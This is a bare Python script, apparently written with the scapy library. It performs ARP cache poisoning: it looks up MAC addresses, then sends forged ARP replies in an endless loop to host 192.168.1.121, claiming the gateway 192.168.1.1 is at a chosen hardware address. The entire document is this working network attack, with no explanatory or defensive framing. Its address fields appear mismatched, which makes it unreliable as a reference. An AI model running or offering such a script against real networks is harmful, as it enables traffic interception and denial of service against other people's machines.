from scapy.all import *


def get_mac(ip):
    return sr1(ARP(op=1, pdst=ip))[ARP].hwsrc


send(ARP(op=2, psrc='192.168.1.1', pdst='192.168.1.121', hwdst=get_mac('192.168.1.1'), hwsrc=get_mac("192.168.1.121")), loop=1)
